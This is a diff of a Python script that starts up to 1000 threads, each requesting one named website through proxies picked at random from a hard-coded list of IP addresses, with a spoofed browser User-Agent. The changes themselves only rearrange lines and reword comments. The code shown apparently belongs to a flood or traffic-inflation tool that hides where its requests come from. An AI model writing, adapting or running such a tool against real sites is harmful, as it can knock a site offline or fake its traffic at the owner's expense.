@@ -1,8 +1,6 @@
 #! /usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-import os
-import sys
 import urllib.request
 import urllib.parse
 import socket
@@ -11,17 +9,15 @@ import time
 import math
 import random
 
-curPath = os.path.abspath(os.path.dirname(__file__))
-sys.path.append(curPath)
-
+# 测试的地址
+url = 'http://www.langsspt.com/'
 # 同时运行的线程数 （每个电脑能开的线程数不同（我：893个线程），如果超过了系统的最大负荷，则只创建能创建的最大线程数）
 THREADS_COUNT = 1000
-
 # 已创建的线程数
 CREATED_THREAD = 0
 # 死亡的线程数
 DEAD_THREAD = 0
-url = 'http://www.langsspt.com/'
+
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
              (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'
 readyIp = ['1.9.171.51:800',
@@ -117,7 +113,7 @@ class ProxyThread(threading.Thread):
         req = urllib.request.Request(url)
         req.add_header('User-Agent', user_agent)
         i = math.floor(random.random()*len(readyIp))
-        socket.setdefaulttimeout(10)  # 3秒未响应则为超时，跳过执行下一条
+        socket.setdefaulttimeout(10)  # 超时未响应则抛出timeout异常
         try:
             proxy_handler = urllib.request.ProxyHandler({'http': readyIp[i]})
             proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
